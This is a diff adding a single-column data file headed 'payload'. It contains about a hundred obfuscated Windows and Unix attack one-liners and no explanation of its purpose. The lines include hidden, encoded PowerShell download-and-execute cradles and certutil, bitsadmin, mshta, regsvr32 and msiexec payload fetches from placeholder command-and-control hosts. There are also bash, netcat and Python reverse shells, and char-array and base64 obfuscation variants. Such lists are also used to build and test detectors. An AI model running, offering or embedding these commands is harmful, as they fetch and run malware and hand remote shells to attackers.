@@ -1,0 +1,101 @@
+payload
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAGUAdgBpAGwANgA1ADUALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=
+powershell.exe -NoP -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBkAHIAbwBwAC0AYwAyADIANgAuAGUAeABhAG0AcABsAGUALwB4AC4AZQB4AGUAJwAsACcAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB4AC4AZQB4AGUAJwApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAeAAuAGUAeABlAA==
+powershell.exe -NoP -W Hidden -Enc aQB3AHIAIABoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AbQBhAGwAdwBhAHIAZQAyADUAMQAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUAcgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAHMAdABhAGcAZQByADEANAAzAC4AZQB4AGEAbQBwAGwAZQAvAHgALgBwAHMAMQAnACkA
+powershell.exe -NoP -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AGkAZQB4ACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8AdABsAHMALQBjADIALQBiAGUAYQBjAG8AbgA2ADkAMwAuAGUAeABhAG0AcABsAGUALwB4ACkA
+powershell.exe -NoP -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AGkAZQB4ACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8AdABsAHMALQBjADIALQBwAGEAeQBsAG8AYQBkADkAMAAuAGUAeABhAG0AcABsAGUALwB4ACkA
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAGQAcgBvAHAAcABlAHIANAAzADMALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAGkAbQBwAGwAYQBuAHQAMwAxAC4AZQB4AGEAbQBwAGwAZQAvAHgALgBwAHMAMQAnACkA
+powershell.exe -NoP -W Hidden -Enc aQB3AHIAIABoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AcgBhAHQAMgAyADQALgBlAHgAYQBtAHAAbABlAC8AcwB0AGEAZwBlAHIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA==
+powershell.exe -NoP -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AGkAZQB4ACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8AdABsAHMALQBjADIALQBiAGEAYwBrAGQAbwBvAHIANQAxADgALgBlAHgAYQBtAHAAbABlAC8AeAApAA==
+powershell.exe -NoP -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AGkAZQB4ACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8AdABsAHMALQBjADIALQBlAHgAcABsAG8AaQB0ADIAOAAuAGUAeABhAG0AcABsAGUALwB4ACkA
+powershell.exe -NoP -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AGkAZQB4ACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8AdABsAHMALQBjADIALQBwAGgAaQBzAGgAMgAwADQALgBlAHgAYQBtAHAAbABlAC8AeAApAA==
+powershell.exe -NoP -W Hidden -Enc aQB3AHIAIABoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AeABzAHMANAAzADAALgBlAHgAYQBtAHAAbABlAC8AcwB0AGEAZwBlAHIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA==
+powershell.exe -NoP -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AJwBUAGwAcwAxADIAJwA7AGkAZQB4ACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8AdABsAHMALQBjADIALQBkAHIAaQB2AGUALQBiAHkANAA2ADAALgBlAHgAYQBtAHAAbABlAC8AeAApAA==
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAGMAbwBiAGEAbAB0ADIAOAA1AC4AZQB4AGEAbQBwAGwAZQAvAHgALgBwAHMAMQAnACkA
+powershell.exe -NoP -W Hidden -Enc aQB3AHIAIABoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AZQB2AGkAbAA3ADcAOAAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUAcgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA
+powershell.exe -NoP -W Hidden -Enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjAG4AYwAtAGMAMgA3ADEANQAuAGUAeABhAG0AcABsAGUALwBsAG8AYQBkAGUAcgAnACkAKQA=
+powershell.exe -NoP -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBkAHIAbwBwAC0AbQBhAGwAdwBhAHIAZQAzADQAOQAuAGUAeABhAG0AcABsAGUALwB4AC4AZQB4AGUAJwAsACcAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB4AC4AZQB4AGUAJwApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAeAAuAGUAeABlAA==
+powershell.exe -NoP -W Hidden -Enc aQB3AHIAIABoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AcwB0AGEAZwBlAHIAMQA2ADAALgBlAHgAYQBtAHAAbABlAC8AcwB0AGEAZwBlAHIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAGkAZQB4AA==
+powershell.exe -NoP -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBkAHIAbwBwAC0AYgBlAGEAYwBvAG4AOQA4ADEALgBlAHgAYQBtAHAAbABlAC8AeAAuAGUAeABlACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAeAAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHgALgBlAHgAZQA=
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAHAAYQB5AGwAbwBhAGQAMQAwADUALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAGQAcgBvAHAAcABlAHIAMwA5ADAALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=
+powershell.exe -NoP -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBkAHIAbwBwAC0AaQBtAHAAbABhAG4AdAAzADYAOAAuAGUAeABhAG0AcABsAGUALwB4AC4AZQB4AGUAJwAsACcAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB4AC4AZQB4AGUAJwApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAeAAuAGUAeABlAA==
+powershell.exe -NoP -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBkAHIAbwBwAC0AcgBhAHQANgAxADkALgBlAHgAYQBtAHAAbABlAC8AeAAuAGUAeABlACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAeAAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHgALgBlAHgAZQA=
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAtAGIAYQBjAGsAZABvAG8AcgA4ADIANwAuAGUAeABhAG0AcABsAGUALwB4AC4AcABzADEAJwApAA==
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-0.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-1.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-2.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-3.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-4.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-5.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-6.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-7.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-8.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-9.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-10.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-11.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-12.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-13.example/x.ps1|iex"""
+"cmd.exe /V:ON /c set a=power^shell&&set b=Invoke-WebRequest&&!a! -c ""!b! http://c2-14.example/x.ps1|iex"""
+certutil.exe -urlcache -split -f http://cert-drop-0.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-1.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-2.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-3.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-4.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-5.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-6.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-7.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-8.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+certutil.exe -urlcache -split -f http://cert-drop-9.example/x.exe C:\Users\Public\svc.exe && start C:\Users\Public\svc.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-0.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-1.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-2.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-3.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-4.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-5.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-6.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-7.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-8.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+bitsadmin /transfer job1 /priority normal http://bits-drop-9.example/x.exe C:\Windows\Temp\bg.exe & start C:\Windows\Temp\bg.exe
+mshta.exe http://hta-c2-0.example/loader.hta
+mshta.exe http://hta-c2-1.example/loader.hta
+mshta.exe http://hta-c2-2.example/loader.hta
+mshta.exe http://hta-c2-3.example/loader.hta
+mshta.exe http://hta-c2-4.example/loader.hta
+mshta.exe http://hta-c2-5.example/loader.hta
+mshta.exe http://hta-c2-6.example/loader.hta
+mshta.exe http://hta-c2-7.example/loader.hta
+mshta.exe http://hta-c2-8.example/loader.hta
+mshta.exe http://hta-c2-9.example/loader.hta
+regsvr32.exe /u /s /i:http://sct-0.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-1.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-2.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-3.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-4.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-5.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-6.example/x.sct scrobj.dll
+regsvr32.exe /u /s /i:http://sct-7.example/x.sct scrobj.dll
+msiexec.exe /q /i https://msi-0.example/pack.msi
+msiexec.exe /q /i https://msi-1.example/pack.msi
+msiexec.exe /q /i https://msi-2.example/pack.msi
+msiexec.exe /q /i https://msi-3.example/pack.msi
+msiexec.exe /q /i https://msi-4.example/pack.msi
+bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'
+mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.5 4445 >/tmp/f
+"python -c ""import socket,os,pty;s=socket.socket();s.connect(('1.2.3.6',4446));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn('/bin/sh')"""
+bash -c 'bash -i >& /dev/tcp/1.2.3.7/4447 0>&1'
+mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.8 4448 >/tmp/f
+"python -c ""import socket,os,pty;s=socket.socket();s.connect(('1.2.3.9',4449));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn('/bin/sh')"""
+bash -c 'bash -i >& /dev/tcp/1.2.3.10/4450 0>&1'
+mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.11 4451 >/tmp/f
+"[char[]]@(73,69,88,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,99,104,97,114,45,48,46,101,120,97,109,112,108,101,47,120,39,41) -join '' | iex"
+"[char[]]@(73,69,88,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,99,104,97,114,45,49,46,101,120,97,109,112,108,101,47,120,39,41) -join '' | iex"
+"[char[]]@(73,69,88,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,99,104,97,114,45,50,46,101,120,97,109,112,108,101,47,120,39,41) -join '' | iex"
+"[char[]]@(73,69,88,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,99,104,97,114,45,51,46,101,120,97,109,112,108,101,47,120,39,41) -join '' | iex"
+"[char[]]@(73,69,88,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,99,104,97,114,45,52,46,101,120,97,109,112,108,101,47,120,39,41) -join '' | iex"
+"powershell -c ""[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYjY0LTAuZXhhbXBsZS94LnBzMScp')) | iex"""
+"powershell -c ""[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYjY0LTEuZXhhbXBsZS94LnBzMScp')) | iex"""
+"powershell -c ""[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYjY0LTIuZXhhbXBsZS94LnBzMScp')) | iex"""
+"powershell -c ""[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYjY0LTMuZXhhbXBsZS94LnBzMScp')) | iex"""
